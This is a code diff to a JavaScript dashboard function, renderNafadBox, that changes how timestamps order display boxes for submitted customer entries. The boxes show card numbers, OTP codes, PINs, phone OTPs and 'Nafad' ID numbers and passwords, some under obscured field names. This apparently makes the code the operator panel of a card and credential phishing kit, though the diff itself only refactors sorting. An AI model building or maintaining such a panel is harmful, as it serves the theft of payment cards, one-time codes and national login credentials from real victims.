@@ -2047,7 +2047,11 @@ const renderNafadBox = () => {
     // Create a box for each entry in customerEntryGroup that has basic or insurance data
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
-      const entryTimestamp = new Date(entry.submittedAt || entry.updatedAt || 0).getTime();
+      // Use entry ID as unique base timestamp to ensure stable ordering
+      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
+      const BOX_TYPE_OFFSET = 0;
+      const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
       
       // Check if this entry has basic data (identity, name, phone, etc.)
@@ -2267,7 +2271,10 @@ const renderNafadBox = () => {
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const cardNumber = raw._v1 || raw.cardNumber;
-      const entryTimestamp = new Date(raw._v1UpdatedAt || raw.cardSubmittedAt || entry.submittedAt || entry.updatedAt || 0).getTime();
+      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
+      const BOX_TYPE_OFFSET = 1;
+      const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
       
       // Check if this entry has card data
@@ -2363,7 +2370,10 @@ const renderNafadBox = () => {
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const otpCode = raw._v5 || raw.otpCode;
-      const entryTimestamp = new Date(raw.otpSubmittedAt || raw._v5UpdatedAt || entry.submittedAt || entry.updatedAt || 0).getTime();
+      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
+      const BOX_TYPE_OFFSET = 2;
+      const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
       
       // Check if this entry has OTP data
@@ -2438,7 +2448,10 @@ const renderNafadBox = () => {
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const pinCode = raw._v6 || raw.pinCode;
-      const entryTimestamp = new Date(raw._v6UpdatedAt || raw.pinSubmittedAt || entry.submittedAt || entry.updatedAt || 0).getTime();
+      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
+      const BOX_TYPE_OFFSET = 3;
+      const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
       
       // Check if this entry has PIN data
@@ -2513,7 +2526,10 @@ const renderNafadBox = () => {
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const hasPhone = raw.phoneNumber || raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
-      const entryTimestamp = new Date(raw._v7UpdatedAt || raw.phoneSubmittedAt || entry.submittedAt || entry.updatedAt || 0).getTime();
+      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
+      const BOX_TYPE_OFFSET = 4;
+      const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
       
       // Check if this entry has phone data
@@ -2609,7 +2625,10 @@ const renderNafadBox = () => {
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const hasNafad = raw.nafadIdNumber || raw.nafadPassword;
-      const entryTimestamp = new Date(raw.nafadSubmittedAt || entry.submittedAt || entry.updatedAt || 0).getTime();
+      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
+      const BOX_TYPE_OFFSET = 5;
+      const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
       const isLatest = index === 0;
       
       // Check if this entry has Nafad data
